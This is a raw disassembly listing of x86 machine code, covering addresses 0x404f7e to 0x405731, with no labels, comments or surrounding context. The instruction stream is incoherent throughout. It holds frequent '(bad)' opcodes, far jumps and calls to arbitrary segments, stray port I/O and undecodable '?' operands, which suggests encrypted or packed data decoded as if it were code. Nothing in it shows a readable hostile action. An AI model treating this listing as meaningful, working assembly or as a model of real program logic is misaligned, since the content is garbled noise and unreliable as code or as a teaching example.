  404f7e:	xchg   DWORD PTR [edi],ebp
  404f80:	push   edx
  404f81:	or     DWORD PTR [eax+0x59111efa],eax
  404f87:	ror    BYTE PTR [ebx],1
  404f89:	push   ebp
  404f8a:	(bad)  
  404f8b:	xor    ecx,DWORD PTR [esi+0x31ac7179]
  404f91:	ins    DWORD PTR es:[edi],dx
  404f92:	mov    ecx,0x42704c25
  404f97:	std    
  404f98:	xchg   ecx,eax
  404f99:	lock ret 
  404f9b:	fcomp  QWORD PTR [esi-0x6e93ead3]
  404fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fa2:	or     bl,dh
  404fa4:	jmp    0x567e048a
  404fa9:	and    al,0x7d
  404fac:	and    bh,al
  404fae:	sbb    BYTE PTR [ecx+0x20],bh
  404fb1:	icebp  
  404fb2:	int3   
  404fb3:	dec    edi
  404fb4:	jae    0x404f4c
  404fb6:	rcl    DWORD PTR [eax],1
  404fb8:	jmp    0x3df3:0xc323696c
  404fbf:	jge    0x405034
  404fc1:	mov    edx,0xefcb6604
  404fc6:	mov    al,0xb2
  404fc8:	inc    edx
  404fc9:	and    cl,bl
  404fcb:	xor    DWORD PTR [edi+ebp*2+0x30],edi
  404fcf:	fsubr  QWORD PTR [eax]
  404fd1:	push   esp
  404fd2:	jl     0x405025
  404fd4:	push   0xffffff84
  404fd6:	psrad  mm1,QWORD PTR [eax-0x6aebd6f4]
  404fdd:	or     al,0x38
  404fdf:	push   ecx
  404fe0:	je     0x404f63
  404fe2:	call   0x913c:0x2661f739
  404fe9:	ins    DWORD PTR es:[edi],dx
  404fea:	mov    dl,cl
  404fec:	mov    bl,0x3a
  404fee:	ret    
  404fef:	xor    al,0x9a
  404ff1:	loopne 0x404ffc
  404ff3:	out    dx,al
  404ff4:	and    DWORD PTR [eax-0x4fc390f4],edi
  404ffa:	lods   eax,DWORD PTR ds:[esi]
  404ffb:	std    
  404ffc:	push   0x3e
  404ffe:	inc    eax
  404fff:	inc    eax
  405000:	dec    esp
  405001:	mov    al,0x9b
  405003:	cmp    al,0x94
  405005:	into   
  405006:	add    eax,0x5c59bfdf
  40500b:	int3   
  40500c:	push   esp
  40500d:	pushf  
  40500e:	push   ebx
  40500f:	mov    edi,0x5017ac55
  405014:	pop    esi
  405015:	lds    eax,FWORD PTR [ebp+ebp*8-0x5b]
  405019:	popa   
  40501a:	stos   BYTE PTR es:[edi],al
  40501b:	sub    ebx,DWORD PTR [eax]
  40501d:	push   ss
  40501e:	(bad)  
  405020:	xchg   ebx,eax
  405021:	ret    
  405022:	pop    es
  405023:	add    al,0x40
  405025:	jno    0x404fbe
  405027:	jb     0x40508e
  405029:	loop   0x40506d
  40502b:	dec    ecx
  40502c:	cmc    
  40502d:	test   DWORD PTR [eax-0x6],ecx
  405030:	fsub   DWORD PTR cs:[edi]
  405033:	int    0x81
  405035:	xchg   esi,eax
  405036:	or     ch,0x35
  405039:	adc    dh,BYTE PTR [ebx]
  40503b:	sbb    BYTE PTR [eax-0x5ff1c04],0xf0
  405042:	push   ds
  405043:	pandn  mm6,QWORD PTR [ebp+0x23]
  405047:	pop    esp
  405048:	mov    al,ds:0xdd19ec99
  40504d:	pop    ebx
  40504e:	data16 ds loope 0x4050bf
  405052:	imul   ecx,edx,0xfffffff6
  405055:	fcom   st(1)
  405057:	inc    ecx
  405058:	and    DWORD PTR [eax+0x3a7af9cc],esi
  40505e:	popa   
  40505f:	dec    edi
  405060:	jmp    0x6c1:0x42452426
  405067:	sbb    BYTE PTR [ebp+0x39],bh
  40506a:	test   DWORD PTR [ebx+0x3a],0xc372d8cb
  405071:	jb     0x4050c6
  405073:	mov    ebx,0x8b7539c3
  405078:	aam    0xf4
  40507a:	add    DWORD PTR [edx+0x3e],ebp
  40507d:	inc    edi
  40507e:	es mov edx,0x14c28f21
  405084:	loop   0x405069
  405086:	dec    eax
  405087:	cmp    BYTE PTR [edx+0x19],0xfb
  40508b:	retf   0x2cde
  40508e:	and    bl,BYTE PTR [edi+0x41]
  405091:	mov    ah,0xfb
  405093:	aaa    
  405094:	rol    ch,0x16
  405097:	rcr    BYTE PTR [ecx+0x79126722],1
  40509d:	dec    ebp
  40509e:	xchg   esi,eax
  40509f:	fisub  WORD PTR [ebx-0x1d945902]
  4050a5:	inc    esi
  4050a6:	or     eax,0x475f9273
  4050ab:	fwait
  4050ac:	sbb    DWORD PTR [ecx],ebx
  4050ae:	mov    ecx,0x8e6f42d9
  4050b3:	jae    0x405094
  4050b5:	add    DWORD PTR [ecx-0x5de48b18],ebx
  4050bb:	xchg   ebp,eax
  4050bc:	pop    ss
  4050bd:	aaa    
  4050be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050bf:	sbb    BYTE PTR [ebp+0x6a91f62e],cl
  4050c5:	dec    edi
  4050c6:	fs dec edi
  4050c8:	pop    es
  4050c9:	out    0x2c,eax
  4050cb:	pop    ecx
  4050cc:	rcl    DWORD PTR [ecx],0x6c
  4050cf:	dec    dl
  4050d1:	adc    al,0x0
  4050d3:	jmp    0x3b83:0xaf9ffdaa
  4050da:	jmp    0x40506d
  4050dc:	cwde   
  4050dd:	pop    es
  4050de:	fild   DWORD PTR [ebp+0xc23c13a]
  4050e4:	(bad)  
  4050e5:	fisubr DWORD PTR [edi+ecx*8+0x3c]
  4050e9:	out    0x5c,eax
  4050eb:	in     eax,dx
  4050ec:	cwde   
  4050ed:	repnz cmp eax,0xfd37a4f0
  4050f3:	in     al,0x6a
  4050f5:	rol    BYTE PTR [esi],cl
  4050f7:	ins    DWORD PTR es:[edi],dx
  4050f8:	clc    
  4050f9:	retf   0x8be1
  4050fc:	ins    BYTE PTR es:[edi],dx
  4050fd:	adc    DWORD PTR [ebx-0xfc54677],esi
  405103:	cs out 0xf4,eax
  405106:	daa    
  405107:	and    al,0x43
  405109:	pop    eax
  40510a:	add    al,0xb6
  40510c:	and    bh,dh
  40510e:	scas   eax,DWORD PTR es:[edi]
  40510f:	test   DWORD PTR [ebx],esp
  405111:	mov    ebp,0x5e34345
  405116:	lods   al,BYTE PTR ds:[esi]
  405117:	jl     0x4050f6
  405119:	inc    edx
  40511a:	test   BYTE PTR [ebp-0x8],0xa4
  40511e:	mov    ebx,0x5258ac68
  405123:	dec    esp
  405124:	test   DWORD PTR [edx+0xca885d4],esp
  40512a:	test   esi,eax
  40512c:	in     eax,0x22
  40512e:	push   eax
  40512f:	jnp    0x40518b
  405131:	fs jne 0x405153
  405134:	push   0x5b
  405136:	stos   DWORD PTR es:[edi],eax
  405137:	xchg   ebp,eax
  405138:	mov    DWORD PTR ds:0xa7411a3a,esi
  40513e:	push   cs
  40513f:	retf   
  405140:	xchg   esp,eax
  405141:	xchg   edx,eax
  405142:	push   ss
  405143:	aaa    
  405144:	rcl    BYTE PTR [ebx-0x14],1
  405147:	mov    ds:0x1718fce0,eax
  40514c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40514d:	pop    ds
  40514e:	lea    esi,[eax-0x66]
  405151:	push   ss
  405152:	mov    ecx,0x9c6fa33d
  405157:	int    0xcc
  405159:	rcr    DWORD PTR [esi+0x4b],cl
  40515c:	stc    
  40515d:	jmp    0x405128
  40515f:	mov    ebp,DWORD PTR [esi+0x5b8a06e9]
  405165:	mov    ds:0x50e102c3,al
  40516a:	mov    ds:0x3d4262d8,al
  40516f:	mov    eax,ds:0xaa68836d
  405174:	mov    bl,0x16
  405176:	inc    ebx
  405177:	call   0xca2d:0x394c825
  40517e:	xchg   esi,eax
  40517f:	pushf  
  405180:	inc    esp
  405181:	adc    dh,bl
  405183:	cmp    DWORD PTR [edi+0x69],eax
  405186:	cmp    al,0xdd
  405188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405189:	and    DWORD PTR ds:[ecx+0x552cf81],esp
  405190:	ret    
  405191:	repz lds eax,FWORD PTR [ebx-0x42]
  405195:	fs (bad) 
  405197:	sar    DWORD PTR [ebx-0x7b],cl
  40519a:	add    BYTE PTR [ebx+0x2c],0x69
  40519e:	jbe    0x4051f1
  4051a0:	inc    ebp
  4051a1:	dec    esp
  4051a3:	or     al,0x74
  4051a5:	add    BYTE PTR [ebx+0x26],bh
  4051a8:	test   ah,bh
  4051aa:	outs   dx,BYTE PTR ds:[esi]
  4051ab:	out    0xfa,al
  4051ad:	sub    BYTE PTR [ecx+0x20e07a00],dh
  4051b3:	jo     0x4051a6
  4051b5:	lock out 0x11,eax
  4051b8:	mov    eax,ds:0x158bd9cc
  4051bd:	mov    ebx,0xb7555857
  4051c2:	out    0x1d,al
  4051c4:	(bad)  
  4051c5:	in     eax,0x56
  4051c7:	add    DWORD PTR [esi],eax
  4051c9:	mov    esp,0x2d46816b
  4051ce:	sar    BYTE PTR [esp+esi*4],cl
  4051d1:	fstp   DWORD PTR [ebp-0x2b]
  4051d4:	jbe    0x40520f
  4051d6:	jle    0x405204
  4051d8:	(bad)  
  4051d9:	jmp    0x4051a7
  4051db:	idiv   ecx
  4051dd:	and    ecx,DWORD PTR [ecx]
  4051df:	data16 mov ah,0x88
  4051e2:	pop    ss
  4051e3:	scas   al,BYTE PTR es:[edi]
  4051e4:	arpl   WORD PTR [ebx+0x3874bdec],sp
  4051ea:	pushf  
  4051eb:	dec    edx
  4051ec:	sti    
  4051ed:	push   DWORD PTR [ebp-0x5d]
  4051f0:	mov    ds:0xdca9dd8b,eax
  4051f5:	nop
  4051f6:	popa   
  4051f7:	xchg   ebx,eax
  4051f8:	and    edi,DWORD PTR [edi+edx*2-0x24bfe773]
  4051ff:	xchg   edi,eax
  405200:	out    0x8f,eax
  405202:	xlat   BYTE PTR ds:[ebx]
  405203:	mov    eax,0xb9983888
  405208:	mov    ecx,0x68148988
  40520d:	nop
  40520e:	sub    bh,BYTE PTR [eax-0x554d93d0]
  405214:	dec    esp
  405215:	fisubr DWORD PTR [esi]
  405217:	xor    eax,0xa75792df
  40521c:	in     al,0x88
  40521e:	inc    esp
  40521f:	mov    WORD PTR [ecx-0x26],?
  405222:	dec    ebx
  405223:	outs   dx,BYTE PTR fs:[esi]
  405225:	sahf   
  405226:	rol    BYTE PTR [edx-0x72772829],cl
  40522c:	idiv   BYTE PTR [edx-0x3e]
  40522f:	scas   al,BYTE PTR es:[edi]
  405230:	or     DWORD PTR [eax],ebx
  405232:	lds    ebx,FWORD PTR [edx+0x1690ca89]
  405238:	push   ebx
  405239:	test   BYTE PTR [bp+si],ch
  40523c:	xor    eax,0x18a25a02
  405241:	xchg   ecx,eax
  405242:	mov    ah,0x2a
  405244:	mov    bl,0xa4
  405246:	or     DWORD PTR [ecx],0xe89c41df
  40524c:	hlt    
  40524d:	ret    
  40524e:	pop    DWORD PTR [ecx+edx*8]
  405251:	mov    ds:0xa36c106b,eax
  405256:	xor    DWORD PTR [edx-0x62],edi
  405259:	sub    ebx,eax
  40525b:	cli    
  40525c:	ds push esp
  40525e:	(bad)
  405261:	sub    BYTE PTR [edx-0x7e],ch
  405264:	adc    al,0xa0
  405266:	xor    al,0x3c
  405268:	stos   BYTE PTR es:[edi],al
  405269:	fist   DWORD PTR ss:[ecx-0x39f41963]
  405270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405271:	add    ah,BYTE PTR [ebx-0x31]
  405274:	dec    esi
  405275:	mov    ds:0xf8f3693e,eax
  40527a:	ret    0x90d3
  40527d:	push   edi
  40527e:	scas   al,BYTE PTR es:[edi]
  40527f:	mov    ds:0x8f6a617c,al
  405284:	mov    bh,0x1b
  405286:	dec    esp
  405287:	mov    eax,ds:0x35d8519
  40528c:	xor    al,0x6
  40528e:	dec    esi
  40528f:	jbe    0x4052a4
  405291:	add    DWORD PTR [edi-0x4d],ebp
  405294:	dec    esi
  405295:	jle    0x40526d
  405297:	sub    al,ch
  405299:	jb     0x40529d
  40529b:	mov    al,ds:0xb7e317ac
  4052a0:	mov    cl,0x63
  4052a2:	loope  0x4052d3
  4052a4:	and    DWORD PTR [ebx],ebp
  4052a6:	mov    esi,0x5b41bbb
  4052ab:	into   
  4052ac:	arpl   WORD PTR [eax],dx
  4052ae:	sbb    ebp,DWORD PTR [edx+0x74]
  4052b1:	xchg   ebp,eax
  4052b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b3:	ins    BYTE PTR es:[edi],dx
  4052b4:	push   eax
  4052b5:	lock push esi
  4052b7:	sub    DWORD PTR [ebp+eiz*2+0x14fa57f4],ecx
  4052be:	sbb    DWORD PTR [eax+0x75],edx
  4052c1:	fsub   st,st(4)
  4052c3:	sub    ecx,DWORD PTR [eax-0x1d]
  4052c6:	stos   BYTE PTR es:[edi],al
  4052c7:	gs add bh,dh
  4052ca:	and    eax,0xd55c2b09
  4052cf:	xlat   BYTE PTR ds:[ebx]
  4052d0:	cmp    al,0x1b
  4052d2:	or     al,0x67
  4052d4:	pop    esi
  4052d5:	sti    
  4052d6:	adc    ch,BYTE PTR [ebx]
  4052d8:	sub    eax,0xc9862200
  4052dd:	jae    0x40531b
  4052df:	(bad)  
  4052e0:	lahf   
  4052e1:	stos   BYTE PTR es:[edi],al
  4052e2:	outs   dx,BYTE PTR ds:[esi]
  4052e3:	and    eax,eax
  4052e5:	jmp    0x3776:0xd70fbf85
  4052ec:	not    DWORD PTR [eax+0x58]
  4052ef:	and    al,0x83
  4052f1:	mov    WORD PTR [esi],cs
  4052f3:	jle    0x4052af
  4052f5:	and    DWORD PTR [ebx],eax
  4052f7:	mov    bl,0xb0
  4052f9:	pop    ebx
  4052fa:	(bad)  [ebp-0x249c438e]
  405300:	inc    ebx
  405301:	out    dx,al
  405302:	inc    edx
  405303:	(bad)  
  405305:	arpl   WORD PTR [eax-0x7],ax
  405308:	ror    DWORD PTR [eax+ebx*8+0x71b7c829],1
  40530f:	sar    BYTE PTR [ebx],0x3b
  405312:	push   ebx
  405313:	je     0x405319
  405315:	jbe    0x4052bb
  405317:	(bad)  
  405318:	or     ebx,eax
  40531a:	inc    ebp
  40531b:	and    ebp,esi
  40531d:	ins    BYTE PTR es:[edi],dx
  40531e:	mov    esi,0xa39b9100
  405323:	or     al,0xd5
  405325:	dec    BYTE PTR [eax-0x4508ac8b]
  40532b:	jbe    0x4052cd
  40532d:	xor    bl,0x7a
  405330:	fwait
  405331:	add    DWORD PTR [esi],ebx
  405333:	push   edi
  405334:	lea    esp,ds:[ebp+0x448b853b]
  40533b:	xor    eax,0x5f66a7b1
  405340:	mov    ah,0x83
  405342:	jo     0x4053bd
  405344:	xchg   BYTE PTR [ebx],bl
  405346:	push   ecx
  405347:	xor    dh,dl
  405349:	sti    
  40534a:	icebp  
  40534b:	leave  
  40534c:	retf   
  40534d:	dec    ecx
  40534e:	stos   BYTE PTR es:[edi],al
  40534f:	push   cs
  405350:	jecxz  0x405300
  405352:	bound  ebp,QWORD PTR [eax+esi*2]
  405355:	iret   
  405356:	or     al,0xb0
  405358:	inc    edi
  405359:	sbb    eax,0x8a6568
  40535e:	pop    esi
  40535f:	lar    esi,WORD PTR [edx]
  405362:	out    dx,eax
  405363:	outs   dx,BYTE PTR ds:[esi]
  405364:	adc    BYTE PTR [edi],al
  405366:	out    dx,eax
  405367:	retf   
  405368:	icebp  
  405369:	fstp   TBYTE PTR [edi+0x4b]
  40536c:	ss inc ecx
  40536e:	dec    esp
  40536f:	adc    eax,0xc87c1764
  405374:	sbb    ch,BYTE PTR ds:0x42579585
  40537a:	push   ebx
  40537b:	dec    edx
  40537c:	pop    eax
  40537d:	cmp    al,0x82
  40537f:	frstor [edi]
  405381:	sub    dl,BYTE PTR [edi-0x79]
  405384:	pop    ss
  405385:	(bad)  
  405387:	scas   eax,DWORD PTR es:[edi]
  405388:	pusha  
  405389:	idiv   esp
  40538b:	test   eax,0x93ff0ba4
  405391:	in     al,0x9
  405393:	jle    0x405349
  405395:	out    dx,al
  405396:	jno    0x4053c2
  405398:	(bad)  
  405399:	jbe    0x4053e9
  40539b:	(bad)  
  40539c:	dec    esi
  40539d:	jp     0x4053fa
  40539f:	hlt    
  4053a0:	(bad)  
  4053a1:	fsub   DWORD PTR [eax+0x2]
  4053a4:	xor    ch,dh
  4053a6:	cmp    bh,BYTE PTR [edx+0x9]
  4053a9:	push   ss
  4053aa:	adc    DWORD PTR ds:[eax+edi*4+0x6f227d06],ebx
  4053b2:	mov    cl,0x6d
  4053b4:	or     BYTE PTR [eax-0x73033b7e],bh
  4053ba:	push   esi
  4053bb:	mov    edi,0x3aa09e14
  4053c0:	push   eax
  4053c1:	(bad)  
  4053c2:	mov    bh,0x25
  4053c4:	cmp    edi,esi
  4053c6:	and    al,0x11
  4053c8:	push   edx
  4053c9:	in     al,dx
  4053ca:	loop   0x405398
  4053cc:	sbb    BYTE PTR [ecx],cl
  4053ce:	xor    eax,0x975ba049
  4053d3:	jl     0x4053c9
  4053d5:	mov    eax,0xdd25a201
  4053da:	int3   
  4053db:	lods   al,BYTE PTR ds:[esi]
  4053dc:	push   cs
  4053dd:	aam    0xba
  4053df:	push   0x78
  4053e1:	or     al,0x48
  4053e3:	cmp    BYTE PTR [ebp-0x7e],dl
  4053e6:	cs leave 
  4053e8:	ret    0x741d
  4053eb:	mov    ah,0x68
  4053ed:	in     eax,dx
  4053ee:	mov    cl,0xa7
  4053f0:	xor    DWORD PTR [eax+0x54],esi
  4053f3:	sub    edx,edi
  4053f5:	add    esp,edx
  4053f7:	mov    eax,ds:0x188074e0
  4053fc:	mov    DWORD PTR ds:0xde53591,edx
  405402:	lds    esp,FWORD PTR [ebp-0x1ac47f10]
  405408:	push   ecx
  405409:	cld    
  40540a:	inc    ecx
  40540b:	and    DWORD PTR [edi-0x52],esi
  40540e:	adc    BYTE PTR [ecx*8+0x7ae9f6df],ah
  405415:	icebp  
  405416:	push   edx
  405417:	rcr    DWORD PTR [eax],0xf1
  40541a:	mov    edi,0x268038bc
  40541f:	icebp  
  405420:	cld    
  405421:	es inc esi
  405423:	lods   al,BYTE PTR ds:[esi]
  405424:	dec    edx
  405425:	sub    al,0x31
  405427:	cdq    
  405428:	sbb    al,BYTE PTR [edx+edx*2+0x5f]
  40542c:	mov    ?,WORD PTR [edx-0x1cc4e7ae]
  405432:	pop    edi
  405433:	shl    DWORD PTR [ecx-0x5dce2b2c],cl
  405439:	cmp    BYTE PTR [ebp+0x22],dh
  40543c:	cdq    
  40543d:	stos   BYTE PTR es:[edi],al
  40543e:	rcr    BYTE PTR [edi-0x70],0xd3
  405442:	(bad)  
  405443:	ins    BYTE PTR es:[edi],dx
  405444:	sbb    ebx,DWORD PTR [eax+0x4cec657d]
  40544a:	int    0x26
  40544c:	cld    
  40544d:	hlt    
  40544e:	mov    edi,0x1f7d1fc0
  405453:	dec    ecx
  405454:	xchg   esp,eax
  405455:	and    BYTE PTR [ecx+ebx*8],al
  405458:	xor    al,0xa9
  40545a:	inc    ecx
  40545b:	xchg   ebx,eax
  40545c:	jbe    0x4053fd
  40545e:	pop    esi
  40545f:	lahf   
  405460:	cwde   
  405461:	dec    edx
  405462:	mov    edx,0x9d3e88c5
  405467:	push   es
  405468:	pusha  
  405469:	inc    eax
  40546a:	repz data16 into 
  40546d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40546e:	fldcw  WORD PTR [esp+ebx*2]
  405471:	inc    edi
  405472:	push   eax
  405473:	gs cwde 
  405475:	stc    
  405476:	popa   
  405477:	inc    ebx
  405478:	pop    bp
  40547a:	pop    edx
  40547b:	in     al,0xb3
  40547d:	dec    ebp
  40547e:	pop    esp
  40547f:	and    DWORD PTR [edi+0x13ea7ebc],edi
  405485:	xor    DWORD PTR [eax+0x6456c640],ebx
  40548b:	cmp    al,0xdb
  40548d:	neg    DWORD PTR ds:0x72005c58
  405493:	inc    edx
  405494:	out    0x3e,eax
  405496:	sahf   
  405497:	ret    0x9d54
  40549a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40549b:	add    eax,esi
  40549d:	mov    edi,0x28a5e570
  4054a2:	cmp    bh,BYTE PTR gs:[edi-0x470a846]
  4054a9:	call   0x2d55:0x2ab85e92
  4054b0:	mov    eax,0x107e61d3
  4054b5:	dec    ecx
  4054b6:	dec    DWORD PTR [ebp-0x57991703]
  4054bc:	sar    BYTE PTR [ecx-0x5b],1
  4054bf:	iret   
  4054c0:	sbb    cl,al
  4054c2:	dec    ecx
  4054c3:	fwait
  4054c4:	lods   eax,DWORD PTR ds:[esi]
  4054c5:	mov    esp,0x209c0b34
  4054ca:	pop    ebx
  4054cb:	xchg   esp,eax
  4054cc:	mov    dl,0x91
  4054ce:	retf   
  4054cf:	sar    al,cl
  4054d1:	and    BYTE PTR [eax+eiz*2],bh
  4054d4:	(bad)  
  4054d5:	fwait
  4054d6:	mov    ds:0x52da34f7,al
  4054db:	jmp    0xdf7d:0x44739ec8
  4054e2:	or     al,0x70
  4054e4:	pusha  
  4054e5:	jp     0x4054df
  4054e7:	das    
  4054e8:	call   DWORD PTR [ecx+0x5c59d877]
  4054ee:	push   ecx
  4054ef:	mov    eax,0x9d457926
  4054f4:	pop    ebx
  4054f5:	fnstsw WORD PTR [ebx]
  4054f7:	addr16 js 0x4054d4
  4054fa:	push   ds
  4054fb:	enter  0x5a40,0xc7
  4054ff:	sub    ecx,DWORD PTR [edi-0x58568bf8]
  405505:	mov    edi,0xfa93ab94
  40550a:	cli    
  40550b:	xor    eax,0x250224
  405510:	mov    bl,0xf3
  405512:	fmul   DWORD PTR [ebx+0x30c2a07f]
  405518:	push   ebx
  405519:	nop
  40551a:	shl    BYTE PTR [eax-0x7],1
  40551d:	add    eax,0x35660568
  405522:	and    BYTE PTR [eax],0xa8
  405525:	dec    esi
  405526:	or     BYTE PTR [ebx-0x2f0532f],0x81
  40552d:	outs   dx,DWORD PTR ds:[esi]
  40552e:	inc    ebx
  40552f:	aas    
  405530:	ins    BYTE PTR es:[edi],dx
  405531:	out    dx,al
  405532:	jno    0x405566
  405534:	fild   WORD PTR [eax]
  405536:	xor    esp,DWORD PTR [eax+0x68]
  405539:	loope  0x4054ec
  40553b:	mov    edx,0x3ba05072
  405540:	aas    
  405541:	pop    ebp
  405542:	lahf   
  405543:	out    0x5a,al
  405545:	mov    ebp,fs
  405547:	in     al,0x61
  405549:	sbb    BYTE PTR [ecx-0x26],ch
  40554c:	mul    DWORD PTR [esi-0x67]
  40554f:	lods   al,BYTE PTR ds:[esi]
  405550:	repz pop ebx
  405552:	rol    DWORD PTR ds:0x813e813a,1
  405558:	outs   dx,DWORD PTR ds:[esi]
  405559:	repz or al,0x19
  40555c:	and    edx,esi
  40555e:	cmp    dh,BYTE PTR [edx+0x74]
  405561:	outs   dx,DWORD PTR ds:[esi]
  405562:	inc    esi
  405563:	cmp    ch,bl
  405565:	leave  
  405566:	(bad)  
  405568:	ffreep st(1)
  40556a:	sbb    eax,0x990365e
  40556f:	jno    0x405561
  405571:	(bad)
  405575:	dec    esp
  405576:	xchg   esi,eax
  405577:	mov    cl,0x5d
  405579:	mov    ah,0xc7
  40557b:	in     eax,dx
  40557c:	jns    0x4055e2
  40557e:	cmp    edi,ecx
  405580:	js     0x40550e
  405582:	cmc    
  405583:	popf   
  405584:	fidivr WORD PTR [esi+0x5e]
  405587:	xchg   edx,eax
  405588:	cmp    esi,ebp
  40558a:	dec    ebx
  40558b:	test   DWORD PTR [ecx+ecx*2+0x50],ecx
  40558f:	call   0xe182930
  405594:	jns    0x405614
  405596:	test   BYTE PTR [ebp+esi*1-0x39],cl
  40559a:	mov    edx,0xbf4904ee
  40559f:	fnstsw WORD PTR [ecx+0x1e]
  4055a2:	mov    eax,DWORD PTR [ecx]
  4055a4:	popf   
  4055a5:	cmp    ecx,edi
  4055a7:	push   esi
  4055a8:	add    edx,esi
  4055aa:	outs   dx,DWORD PTR ds:[esi]
  4055ab:	mov    bl,BYTE PTR [eax-0x15cb9f4d]
  4055b1:	dec    esp
  4055b2:	push   esi
  4055b3:	inc    edi
  4055b4:	jg     0x405580
  4055b6:	ins    BYTE PTR es:[edi],dx
  4055b7:	xchg   ecx,eax
  4055b8:	mov    ah,0xda
  4055ba:	cld    
  4055bb:	push   es
  4055bc:	mov    edx,DWORD PTR [ecx-0xc]
  4055bf:	adc    eax,0xeecb0fe7
  4055c4:	fs out dx,al
  4055c6:	mov    dh,0x6a
  4055c8:	pop    edi
  4055c9:	pop    ds
  4055ca:	mov    ?,WORD PTR [esi+0x2dda07a0]
  4055d0:	and    dl,al
  4055d2:	imul   ebx,edi,0xffffffad
  4055d5:	sar    DWORD PTR [esi],1
  4055d7:	int    0x5e
  4055d9:	icebp  
  4055da:	or     al,BYTE PTR [eax+esi*4+0x6c99e03d]
  4055e1:	out    dx,al
  4055e2:	add    al,0xd9
  4055e4:	pop    ss
  4055e5:	aaa    
  4055e6:	sbb    al,0x16
  4055e8:	dec    ebp
  4055e9:	rcr    DWORD PTR [ecx+0x232e2553],0xa4
  4055f0:	mov    BYTE PTR [eax],dh
  4055f2:	stos   BYTE PTR es:[edi],al
  4055f3:	cs pushf 
  4055f5:	je     0x4055c5
  4055f7:	xchg   DWORD PTR [eax+0x7b],edx
  4055fa:	inc    ebx
  4055fb:	mov    cs,WORD PTR [esi-0x5170507]
  405601:	and    edx,DWORD PTR [edx+0x7a]
  405604:	cmp    ebx,DWORD PTR [esi+0x7e]
  405607:	xor    al,0x13
  405609:	cdq    
  40560a:	arpl   cx,dx
  40560c:	sub    ch,cl
  40560e:	fcomp  QWORD PTR [eax+0x58]
  405611:	mov    es,WORD PTR [ecx-0x21]
  405614:	mov    ds:0x897a8a91,eax
  405619:	pushf  
  40561a:	cmp    edx,esi
  40561c:	jl     0x4055b3
  40561e:	sub    ah,ah
  405620:	mov    eax,0xc2e40908
  405625:	cwde   
  405626:	inc    ebp
  405627:	gs jb  0x4055e0
  40562a:	jae    0x405641
  40562c:	gs cmp cl,0x7c
  405630:	pop    ds
  405631:	mov    eax,0x91739c4e
  405636:	push   ebp
  405637:	nop
  405638:	add    DWORD PTR [edx],edx
  40563a:	pop    eax
  40563b:	add    ebx,DWORD PTR [edi-0x3a]
  40563e:	(bad)  
  40563f:	pop    ds
  405640:	push   eax
  405641:	add    DWORD PTR [edi-0x57],esi
  405644:	outs   dx,DWORD PTR ds:[esi]
  405645:	pop    eax
  405646:	or     eax,0xd04726ab
  40564b:	fmul   QWORD PTR [eax+eax*8-0x70994183]
  405652:	jne    0x405600
  405654:	jno    0x405661
  405656:	scas   eax,DWORD PTR es:[edi]
  405657:	mov    al,0x68
  40565a:	mov    edx,0x2a2d4396
  40565f:	arpl   WORD PTR [esi-0x37d694b7],bp
  405665:	push   cs
  405666:	xchg   edx,eax
  405667:	imul   BYTE PTR [esp+ebx*4-0x28]
  40566b:	pop    eax
  40566c:	xchg   DWORD PTR [eax+0x25],edx
  40566f:	fmul   st(0),st
  405671:	test   DWORD PTR [ebx],esi
  405673:	sub    ch,bl
  405675:	cmp    DWORD PTR [ebp-0x53],ebx
  405678:	stos   BYTE PTR es:[edi],al
  405679:	mov    WORD PTR [esi+0x27],?
  40567c:	adc    eax,0xebe7306b
  405681:	add    esp,ebx
  405683:	xchg   edx,eax
  405684:	jnp    0x405628
  405686:	mov    fs,WORD PTR [ebp-0x27691bb4]
  40568c:	imul   ecx,DWORD PTR [edi-0x176b8520],0xffffffc8
  405693:	mov    edi,0x6b102e40
  405698:	xor    BYTE PTR [esp+esi*8-0x5e],bl
  40569c:	xor    al,0xb5
  40569e:	xlat   BYTE PTR ds:[ebx]
  40569f:	xchg   edi,eax
  4056a0:	sub    dh,BYTE PTR ds:0x2bb08ff
  4056a6:	je     0x40571a
  4056a8:	out    0xf9,al
  4056aa:	in     al,0xf0
  4056ac:	loopne 0x405688
  4056ae:	lahf   
  4056af:	xor    BYTE PTR ds:0x7dda8fb9,0x18
  4056b6:	dec    esp
  4056b7:	mov    eax,ds:0xdf934cc9
  4056bc:	fild   DWORD PTR [ebp+0x4c]
  4056bf:	cmp    BYTE PTR [ebp+0x362a49d9],0x40
  4056c6:	mov    ebp,0xd31686f3
  4056cb:	fild   QWORD PTR [ebx+edi*4-0x30]
  4056cf:	(bad)  
  4056d0:	ficomp DWORD PTR [eax-0xd00a99c]
  4056d6:	(bad)  [esi]
  4056d8:	add    DWORD PTR [edi+0x22],esp
  4056db:	pop    edi
  4056dc:	jns    0x405664
  4056de:	jnp    0x4056ba
  4056e0:	aaa    
  4056e1:	push   0xffffffe0
  4056e3:	and    edi,ebp
  4056e5:	js     0x4056f2
  4056e7:	out    0x64,al
  4056e9:	or     esp,DWORD PTR [edx-0x30943ad2]
  4056ef:	or     eax,0xaa3d3c5f
  4056f4:	outs   dx,BYTE PTR ds:[esi]
  4056f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f6:	xchg   esi,eax
  4056f7:	sub    DWORD PTR [edx],esp
  4056f9:	mov    eax,ds:0xf7363959
  4056fe:	out    dx,eax
  4056ff:	loop   0x405758
  405701:	cdq    
  405702:	sub    al,0xf4
  405704:	scas   al,BYTE PTR es:[edi]
  405705:	js     0x405699
  405707:	and    esi,DWORD PTR [esi]
  405709:	sub    ah,ch
  40570b:	shl    DWORD PTR [edx+ecx*4+0x64ee4cea],cl
  405712:	push   edx
  405713:	adc    edx,ebx
  405715:	dec    esp
  405716:	mov    ch,0xda
  405718:	(bad)  
  405719:	and    eax,0x52dafc56
  40571e:	push   ss
  40571f:	in     al,0x65
  405721:	ficomp WORD PTR [ebp-0x68bd4f1f]
  405727:	addr16 dec edx
  405729:	lea    edi,[ecx-0x4b]
  40572c:	int    0x45
  40572e:	fidiv  WORD PTR [esi]
  405730:	pusha  
  405731:	fld    DWORD PTR [edi+0x742237a3]
